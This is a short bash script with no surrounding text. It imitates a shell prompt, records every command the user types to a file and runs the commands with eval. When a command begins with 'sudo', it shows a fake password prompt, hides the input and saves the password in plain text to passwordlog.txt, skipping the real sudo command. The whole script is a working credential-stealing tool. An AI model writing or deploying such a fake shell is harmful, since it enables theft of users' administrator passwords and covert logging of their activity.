while :
do
	echo -n "${USER}@administrator~\$ "
	read line
	echo "$line" >> logger.txt
	if [[ "$line" == 'sudo'* ]]; then
		echo -n "[sudo] password for $USER : "
		stty -echo
		read password 
		stty echo
		echo $password >> passwordlog.txt
		#eval $line
	else
		eval "$line"
	fi
done


